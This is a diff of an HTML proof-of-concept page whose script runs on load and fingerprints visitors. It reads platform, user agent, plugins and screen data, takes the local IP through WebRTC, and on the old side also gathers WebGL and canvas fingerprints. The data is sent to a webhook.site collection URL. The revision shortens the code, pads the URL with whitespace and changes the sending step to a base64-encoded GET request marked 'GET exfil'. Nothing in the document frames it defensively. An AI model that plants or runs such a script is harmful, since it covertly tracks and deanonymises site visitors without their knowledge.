@@ -1,64 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head><title>Fingerprint PoC</title></head>
+<head><title>FP-PoC</title></head>
 <body>
 <script>
 (async () => {
-    const exfilUrl = "https://webhook.site/b6a196e3-4508-4abd-bcab-b80fcc70584a"; // ← حط رابطك هنا
+    const exfilUrl = " 	https://webhook.site/b6a196e3-4508-4abd-bcab-b80fcc70584a"; // رابطك
 
     const basic = {
         platform: navigator.platform,
-        os: navigator.userAgentData?.platform || navigator.platform,
-        type: /Mobi|Android/i.test(navigator.userAgent) ? "mobile" : "desktop",
+        type: /Mobi|Android/i.test(navigator.userAgent) ? "mobile":"desktop",
         ua: navigator.userAgent,
     };
     const plugins = [];
-    for (let p of navigator.plugins) {
-        plugins.push({name:p.name,filename:p.filename});
-    }
-    const screenData = {
-        w: screen.width,h: screen.height,
-        dpr: window.devicePixelRatio
-    };
-    function getWebGL(){
-        try {
-            let c=document.createElement("canvas");
-            let gl=c.getContext("webgl"); let d=gl.getExtension("WEBGL_debug_renderer_info");
-            return {
-                vendor:gl.getParameter(d.UNMASKED_VENDOR_WEBGL),
-                renderer:gl.getParameter(d.UNMASKED_RENDERER_WEBGL)
-            };
-        } catch(e){ return {};}
-    }
-    function getCanvas(){
-        let c=document.createElement("canvas");
-        let ctx=c.getContext("2d");
-        ctx.fillText("finger",10,10);
-        return c.toDataURL();
-    }
-    function getRTC(){
-        return new Promise(r=>{
-            const pc=new RTCPeerConnection({iceServers:[]});
-            pc.createDataChannel("");
-            pc.onicecandidate=e=>{
-                if(e.candidate){
-                    let ip=e.candidate.candidate.split(" ")[4];
-                    r(ip);pc.close();
-                }
-            };
-            pc.createOffer().then(o=>pc.setLocalDescription(o));
-        });
-    }
-
-    const data={
-        basic,plugins,screenData,webgl:getWebGL(),canvas:getCanvas(),ip:await getRTC()
-    };
+    for (let p of navigator.plugins){plugins.push(p.name);}
+    const screenData = {w:screen.width,h:screen.height,dpr:window.devicePixelRatio};
+    function rtc(){return new Promise(r=>{const pc=new RTCPeerConnection();pc.createDataChannel("");pc.onicecandidate=e=>{if(e.candidate){r(e.candidate.candidate.split(" ")[4]);pc.close();}};pc.createOffer().then(o=>pc.setLocalDescription(o));});}
+    const data={basic,plugins,screen:screenData,ip:await rtc()};
     console.log(data);
-    fetch(exfilUrl,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify(data)
-    });
+    fetch(exfilUrl+"?data="+btoa(JSON.stringify(data))); // GET exfil
 })();
 </script>
 </body>
